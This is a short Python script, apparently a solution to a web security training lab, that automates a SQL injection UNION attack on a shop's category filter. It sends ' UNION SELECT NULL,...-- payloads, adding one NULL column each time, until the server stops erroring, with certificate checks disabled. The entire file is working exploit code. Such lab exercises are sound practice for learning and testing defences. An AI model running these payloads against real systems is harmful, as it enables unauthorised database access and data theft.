#SQL injection UNION attack, determining the number of columns returned by the query

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def lancer_exploit(url):
    exploit_url=url+"/filter?category=Gifts"
    null="NULL,"
    i=False
    while i==False:
        payload="' UNION SELECT "+null+"--"
        final_payload=payload[:-3]+payload[-2:]
        final_exploit=exploit_url+final_payload
        print(final_exploit)
        exploit_reponse=requests.get(final_exploit,verify=False)
        
        if "Internal Server Error" in exploit_reponse.text:
            i=False
            null=null+"NULL,"
        else:
            i=True
            print(f"Injection effectuer avec succes")
            return True
    

test=lancer_exploit("https://0af500c1042cee1eb1c9b8f300450033.web-security-academy.net")